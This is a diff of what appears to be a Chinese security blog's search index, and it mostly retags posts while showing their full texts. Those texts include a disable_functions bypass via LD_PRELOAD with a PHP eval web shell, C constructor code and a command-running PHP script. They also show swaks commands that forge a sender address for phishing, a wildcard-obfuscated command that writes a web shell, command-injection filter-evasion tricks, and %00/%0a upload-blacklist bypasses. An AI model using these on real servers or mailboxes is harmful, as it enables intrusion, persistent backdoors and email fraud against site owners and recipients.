@@ -67,7 +67,9 @@
     <url>%2Farchives%2F2ea7b633.html</url>
     <content type="text"><![CDATA[前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。 环境搭建ubuntu+apache2+php7.2 配置/etc/php/7.2/apache2/php.ini 设置disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,然后重启apache2 服务器 这样就能把system禁用了 然后在网站的根目录上放一个shell.php &lt;?php @eval($_GET[&apos;fz41&apos;]);?&gt;访问shell.php可以正常执行php的代码，不能执行系统函数。 测试访问http://192.168.44.139/shell.php?fz41=phpinfo();可以看见phpinfo()的信息 访问http://192.168.44.139/shell.php?fz41=system(ls);没有任何回显环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 原理解读LD_PRELOAD的作用LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtimelinker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的 我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system() attribute((constructor))GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。 因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了 代码类似这种#define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void preloadme (void) { unsetenv(&quot;LD_PRELOAD&quot;); const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); system(cmdline); }工具使用https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 复现gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so 然后写利用如下php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt;然后访问http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so参考链接https://www.freebuf.com/articles/web/192052.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD来源:https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ]]></content>
       <categories>
-        <category>渗透技巧</category>
+        <category>知识普及</category>
+        <category>奇淫技巧</category>
+        <category>Php特性</category>
       </categories>
   </entry>
   <entry>
@@ -233,13 +235,18 @@
     <title><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？]]></title>
     <url>%2Farchives%2F368c71e.html</url>
     <content type="text"><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？ 现如今的钓鱼邮件都是通过注册相似的邮箱，或者设置邮箱的显示名称，盼着被害人有看走眼的那一刻，轻信邮件的内容。这种方法需要一定的社工技巧，以及诱导性的语言来诱使被害人上钩。但是对于有一定的经验以及眼力的人来说，还是可以识破骗子的伎俩。 下面我要介绍的这款工具可以最大程度的欺骗你的邮箱，更不要提你的眼睛。当然，此方法不是适用于任何邮箱，毕竟每种邮箱的过滤机制都不相同。gmail在这方面就做的不错。 Swaks - SMTP界的瑞士军刀基本用法： swaks –to &lt;要测试的邮箱&gt; 用来测试邮箱的连通性 root@kali:~# swaks --to xxxx@qq.com === Trying mx3.qq.com:25... === Connected to mx3.qq.com. &lt;- 220 newmx59.qq.com MX QQ Mail Server -&gt; EHLO kali &lt;- 250-newmx59.qq.com &lt;- 250-SIZE 73400320 &lt;- 250-STARTTLS &lt;- 250 OK -&gt; MAIL FROM:&lt;root@kali&gt; &lt;- 250 Ok -&gt; RCPT TO:&lt;xxxx@qq.com&gt; &lt;- 250 Ok -&gt; DATA &lt;- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Tue, 05 Jan 2016 23:15:11 -0500 -&gt; To: xxxx@qq.com -&gt; From: root@kali -&gt; Subject: test Tue, 05 Jan 2016 23:15:11 -0500 -&gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test mailing -&gt; -&gt; . &lt;** 550 Mail content denied. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 -&gt; QUIT &lt;- 221 Bye === Connection closed with remote host.前面都返回250ok，说明该邮箱存在，并且可以正常收信。最后可以看到qq邮箱返回550错误，qq官方给出的出错原因：该邮件内容涉嫌大量群发，并且被多数用户投诉为垃圾邮件。 我们可以继续对邮件进行伪造，来绕过qq邮箱的判断 比如： swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;其中： –from &lt;要显示的发件人邮箱&gt; –ehlo &lt;伪造的邮件ehlo头&gt; –body &lt;邮件正文&gt; –header &lt;邮件头信息，subject为邮件标题&gt;在你ip没有被qq邮箱band的情况下，邮件可以正常发送，返回250 ok。 高级用法：使用swaks其实还可以进行更高级的邮件伪造，几乎可以伪造邮件中的每一个参数。 –data &lt;源邮件&gt; 首先，我们需要一份正常的邮件 M亲测可用的伪造邮箱方法 swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;]]></content>
+      <tags>
+        <tag>知识普及</tag>
+        <tag>奇淫技巧</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[Thinkphp-漏洞列表]]></title>
     <url>%2Farchives%2Ff1b53e95.html</url>
     <content type="text"><![CDATA[Thinkphp-漏洞列表:`https://github.com/Maikefee/pochubs`Thinkphp3.2.3最新版update注入漏洞`https://www.anquanke.com/post/id/104847`ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell:https://xz.aliyun.com/t/99]]></content>
       <categories>
-        <category>常见CMS漏洞</category>
+        <category>漏洞挖掘</category>
+        <category>常见Cms漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -247,15 +254,21 @@
     <url>%2Farchives%2F18ca0ec6.html</url>
     <content type="text"><![CDATA[文章来源: http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php 2.变形后的payload： cmd=/???/e??? &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php]]></content>
       <categories>
-        <category>渗透技巧</category>
+        <category>知识普及</category>
+        <category>奇淫技巧</category>
+        <category>Linux特性</category>
       </categories>
+      <tags>
+        <tag>Linux特性</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[关于命令执行以及常见的一些绕过过滤的方法-浅谈CTF中命令执行与绕过的小技巧]]></title>
     <url>%2Farchives%2Fc6ef1d37.html</url>
     <content type="text"><![CDATA[https://blog.csdn.net/silence1_/article/details/96135760 http://pupiles.com/shellcode.html命令执行的一些绕过技巧 ① 空格过滤空格可以用以下字符串代替：&lt; 、%09、$IFS$9、 ${IFS}等 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 ② 一些命令分隔符%0a 符号、%0d 符号、; 符号、&amp; 符号、| 符号1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 ③ 黑名单绕过1、拼接绕过比如：a=l;b=s;$a$b 上面的第二道题目也是利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b2、base64解码绕过比如：echo MTIzCg==|base64 -d 其将会打印1233、单引号和双引号绕过比如：ca&apos;&apos;t flag 或ca&quot;&quot;t flag4、反斜杠绕过比如：ca\t fl\ag④长度限制长度限制可以用文件构造的方式来绕过。linux下可以用 1&gt;a创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行 利用这些特性，即可以成功绕过长度限制来执行命令。\ M 亲测有效浅谈CTF中命令执行与绕过的小技巧]]></content>
       <categories>
-        <category>渗透技巧</category>
+        <category>知识普及</category>
+        <category>奇淫技巧</category>
       </categories>
   </entry>
   <entry>
@@ -263,7 +276,7 @@
     <url>%2Farchives%2Fd87f7e0c.html</url>
     <content type="text"><![CDATA[一、前言大家好,我叫MaiKeFee,是一名信息安全爱好者,初次见面,先水一篇文章再说.前几天在深圳出差,遇到一个黑名单上传点(Linux+Php(版本未知)),除了Php|Aspx|Jsp|Php3等等类似脚本都试过不能上传,其余可上传;于是第一时间想到测试%00截断显然是不能上传,不然也不会有此下文. 随后随手测试了: %00截断不能上传(实战环境+Linux+nginx+php(未知版本)),但是%0a、%0d,没想到竟然能上传了!!但是很遗憾,它不解析;为了寻找原因开始搭建环境复现.. 二、环境搭建 哒哒哒,环境搭好了,接下来开始测试啦 测试环境:Win+phpstudy(PHP Version 5.4.45)+上传黑名单 1.测试%00截断(上传成功并解析) 2.接下来是测试%0a截断(上传成功并解析) 3.接下来是测试%0d截断(上传失败并报错) 三、Fuzzing根据这样的特性,写个脚本生成Payload(%00-%99)(a-z)进行fuzzing 拿起来fuzzing就是一把梭 经过梭哈后,发现这些空payload,基本都可以绕过黑名单(%00|%0a|%8b|%8c|%8d..) 当然,要是提到黑名单绕过的姿势还是挺多的: 1.根据win的特性,空格也是可以绕过的2.::$DATA数据流绕过,NTFS文件系统特性绕过 3.php3、php5..4.点号(.)绕过,Win特性… 就不一一举例,本人项目环境是(Linux+nginx),绕过黑名单,但是不解析,在Win下测试,绕过后可解析(暂没深入)..总结:遇到00截断不成功的情况下,测试了0a可以成功绕过(估计跟php版本有关,待考察) 但是值得一提的是此文和网上提到https://www.freebuf.com/articles/web/179401.html 这里均提到版本问题,但本人测试环境Php5.4.45,可00截断并解析,这里暂时无从考证了,知道的大佬指点一下迷津!]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>漏洞挖掘</category>
         <category>上传漏洞</category>
       </categories>
   </entry>
